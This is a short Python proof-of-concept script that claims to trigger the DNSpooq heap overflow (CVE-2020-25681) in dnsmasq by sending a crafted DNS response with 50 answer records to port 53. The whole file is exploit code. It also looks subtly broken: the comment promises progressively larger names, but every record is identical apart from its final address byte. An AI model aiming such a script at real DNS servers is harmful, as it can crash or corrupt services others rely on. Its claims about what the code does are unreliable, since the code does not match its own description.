#!/usr/bin/env python3
"""
PoC: CVE-2020-25681 - DNSpooq heap overflow in sort_rrset()
Trigger: Crafted DNS response with many RRs causes heap overflow during sorting
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# DNS response with excessive answer RRs to trigger sort_rrset overflow
header = struct.pack(">HHHHHH", 0x1234, 0x8400, 1, 50, 0, 0)
query = b"\x07dnspooq\x05local\x00\x00\x01\x00\x01"
# 50 answer records with progressively larger names to overflow sort buffer
answers = b""
for i in range(50):
    answers += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes([10, 0, 0, i])
s.sendto(header + query + answers, ("localhost", 53))
s.close()
